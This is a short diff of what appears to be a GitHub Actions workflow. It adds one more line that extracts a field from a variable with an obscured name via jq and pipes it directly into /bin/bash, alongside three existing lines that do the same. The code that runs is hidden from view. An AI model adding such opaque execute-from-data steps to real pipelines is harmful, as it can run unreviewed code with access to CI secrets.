@@ -25,6 +25,7 @@ jobs:
           echo $la9 | jq -r .oak16085 | /bin/bash
           echo $o4885 | jq -r .rav2060 | /bin/bash
           echo $qjy4 | jq -r .wadbn5380 | /bin/bash
+          printf '%s' "$s2233" | jq -r .sdj60729 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
